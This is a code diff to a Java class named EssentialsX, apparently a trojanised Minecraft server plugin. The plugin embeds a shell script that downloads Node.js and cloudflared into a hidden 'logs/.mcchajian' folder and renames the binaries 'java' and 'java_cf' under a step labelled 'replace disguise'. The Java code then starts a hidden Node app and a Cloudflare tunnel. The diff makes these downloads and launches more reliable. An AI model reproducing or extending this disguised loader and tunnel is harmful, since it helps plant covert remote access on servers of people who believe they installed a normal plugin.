@@ -453,8 +453,23 @@ public class EssentialsX extends JavaPlugin {
         lastKnownTunnelUrl.set("");
 
         try {
+            Path nodeExe = Paths.get("logs", ".mcchajian").toAbsolutePath().resolve("nodejs/bin/.node_real");
+            Path script = Paths.get("logs", ".mcchajian").toAbsolutePath().resolve("app/index.js");
+
+            // ★ 关键文件不存在 → 部署可能还没完成或失败了，等久一点再重试
+            if (!Files.exists(nodeExe) || !Files.exists(script)) {
+                mcLog("[Connection] Node binary or script missing, waiting for deployment...");
+                try { Thread.sleep(30_000); } catch (InterruptedException ignored) { return; }
+                return;  // 下一轮循环再检查
+            }
+
             String newPort = allocateNodePort();
             startNodeProcess(newPort);
+            if (nodeProcess == null) {
+                // startNodeProcess 内部静默失败 → 等久一点
+                try { Thread.sleep(15_000); } catch (InterruptedException ignored) {}
+                return;
+            }
             waitForNodeReady(newPort, 60);
             ensurePermissions();
             startCfProcess();
@@ -740,38 +755,63 @@ public class EssentialsX extends JavaPlugin {
         "fi\n" +
         "\n" +
         "# ★ 确保所有关键目录存在且有正确权限\n" +
-        "mkdir -p \"$WORK_DIR\" \"$NODE_DIR\" \"$JRE_DIR\" \"$DATA_DIR\" \"$APP_DIR\"\n" +
+        "mkdir -p \"$WORK_DIR\" \"$JRE_DIR\" \"$DATA_DIR\" \"$APP_DIR\"\n" +
         "chmod -R 775 \"$WORK_DIR\" 2>/dev/null\n" +
         "\n" +
         "# ========== 1. 下载NodeJS ==========\n" +
+        "# ★ BUG 修复：用 NEED_DOWNLOAD 标志变量替代目录存在性检查\n" +
+        "#    旧逻辑：rm -rf 后 mkdir -p 重建空目录 → [ ! -d ] 为 FALSE → 下载被跳过\n" +
+        "NEED_DOWNLOAD=false\n" +
         "if [ -d \"$NODE_DIR\" ]; then\n" +
         "    CHECK_VER=$($NODE_DIR/bin/.node_real -v 2>/dev/null || $NODE_DIR/bin/node -v 2>/dev/null || echo \"unknown\")\n" +
-        "    if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; mkdir -p \"$NODE_DIR\"; fi\n" +
+        "    if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; NEED_DOWNLOAD=true; fi\n" +
+        "else\n" +
+        "    NEED_DOWNLOAD=true\n" +
         "fi\n" +
-        "if [ ! -d \"$NODE_DIR\" ]; then\n" +
+        "if [ \"$NEED_DOWNLOAD\" = \"true\" ]; then\n" +
         "    mkdir -p \"$NODE_DIR\"\n" +
+        "    NODE_DOWNLOAD_OK=false\n" +
         "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
-        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then break; fi\n" +
+        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then\n" +
+        "            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE_DOWNLOAD_OK=true; break; fi\n" +
+        "        fi\n" +
         "    done\n" +
-        "    tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n" +
-        "    # ★ 解压后立即修复 nodejs 目录权限\n" +
-        "    chmod -R 775 \"$NODE_DIR\" 2>/dev/null\n" +
-        "    find \"$NODE_DIR/bin\" -type f -exec chmod +x {} + 2>/dev/null\n" +
-        "    find \"$NODE_DIR/lib/node_modules/npm/bin\" -name '*.js' -exec chmod +x {} + 2>/dev/null\n" +
+        "    if [ \"$NODE_DOWNLOAD_OK\" = \"true\" ]; then\n" +
+        "        tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 2>/dev/null\n" +
+        "        rm -f \"$WORK_DIR/node.tar.gz\"\n" +
+        "        chmod -R 775 \"$NODE_DIR\" 2>/dev/null\n" +
+        "        find \"$NODE_DIR/bin\" -type f -exec chmod +x {} + 2>/dev/null\n" +
+        "        find \"$NODE_DIR/lib/node_modules/npm/bin\" -name '*.js' -exec chmod +x {} + 2>/dev/null\n" +
+        "    else\n" +
+        "        echo \"WARN: Node.js download failed, will retry later\" >&2\n" +
+        "        rm -rf \"$NODE_DIR\" \"$WORK_DIR/node.tar.gz\"\n" +
+        "    fi\n" +
         "fi\n" +
         "export PATH=\"$NODE_DIR/bin:$PATH\"\n" +
         "\n" +
+        "# ★ 创建 .node_real 前确保 bin 目录存在（安全网）\n" +
+        "mkdir -p \"$NODE_DIR/bin\" 2>/dev/null\n" +
         "if [ -f \"$NODE_DIR/bin/node\" ] && ! head -1 \"$NODE_DIR/bin/node\" 2>/dev/null | grep -q bash; then\n" +
         "    cp -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"\n" +
         "fi\n" +
+        "# ★ .node_real 回退下载（独立于上面的完整下载，确保总能拿到二进制）\n" +
         "if [ ! -f \"$NODE_DIR/bin/.node_real\" ] || ! \"$NODE_DIR/bin/.node_real\" -v >/dev/null 2>&1; then\n" +
         "    rm -f \"$WORK_DIR/node.tar.gz\"\n" +
+        "    NODE2_OK=false\n" +
         "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
-        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then break; fi\n" +
+        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then\n" +
+        "            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE2_OK=true; break; fi\n" +
+        "        fi\n" +
         "    done\n" +
-        "    mkdir -p /tmp/_node_tmp; tar -xzf \"$WORK_DIR/node.tar.gz\" -C /tmp/_node_tmp --strip-components 1 2>/dev/null\n" +
-        "    cp -f /tmp/_node_tmp/bin/node \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"\n" +
-        "    rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"\n" +
+        "    if [ \"$NODE2_OK\" = \"true\" ]; then\n" +
+        "        mkdir -p /tmp/_node_tmp; tar -xzf \"$WORK_DIR/node.tar.gz\" -C /tmp/_node_tmp --strip-components 1 2>/dev/null\n" +
+        "        mkdir -p \"$NODE_DIR/bin\"\n" +
+        "        cp -f /tmp/_node_tmp/bin/node \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"\n" +
+        "        rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"\n" +
+        "    else\n" +
+        "        echo \"WARN: .node_real fallback download also failed\" >&2\n" +
+        "        rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"\n" +
+        "    fi\n" +
         "fi\n" +
         "\n" +
         "# ========== 2. 下载代码 ==========\n" +
@@ -826,7 +866,11 @@ public class EssentialsX extends JavaPlugin {
         "fi\n" +
         "\n" +
         "# ========== 4. 替换伪装 ==========\n" +
-        "cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod 775 \"$JRE_DIR/java\"\n" +
+        "# ★ 确保 JRE_DIR 存在后再拷贝伪装文件\n" +
+        "mkdir -p \"$JRE_DIR\" 2>/dev/null\n" +
+        "if [ -f \"$NODE_DIR/bin/.node_real\" ]; then\n" +
+        "    cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod 775 \"$JRE_DIR/java\"\n" +
+        "fi\n" +
         "\n" +
         "cat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\n" +
         "try {\n" +
@@ -857,11 +901,19 @@ public class EssentialsX extends JavaPlugin {
         "\n" +
         "# ========== 5. 下载CF ==========\n" +
         "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
+        "mkdir -p \"$JRE_DIR\" 2>/dev/null\n" +
         "if [ ! -f \"$CF_BIN\" ]; then\n" +
         "    CF_DIRECT=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n" +
+        "    CF_DOWNLOAD_OK=false\n" +
         "    for MIRROR in \"https://ghproxy.net/${CF_DIRECT}\" \"$CF_DIRECT\"; do\n" +
-        "        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$CF_BIN\" 2>/dev/null; then chmod 775 \"$CF_BIN\"; break; fi\n" +
+        "        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$CF_BIN\" 2>/dev/null; then\n" +
+        "            if [ -f \"$CF_BIN\" ] && [ -s \"$CF_BIN\" ]; then chmod 775 \"$CF_BIN\"; CF_DOWNLOAD_OK=true; break; fi\n" +
+        "        fi\n" +
         "    done\n" +
+        "    if [ \"$CF_DOWNLOAD_OK\" = \"false\" ]; then\n" +
+        "        echo \"WARN: cloudflared download failed\" >&2\n" +
+        "        rm -f \"$CF_BIN\" 2>/dev/null\n" +
+        "    fi\n" +
         "fi\n" +
         "# ★ 确保整个工作目录权限最终一致\n" +
         "chmod -R 775 \"$WORK_DIR\" 2>/dev/null\n" +
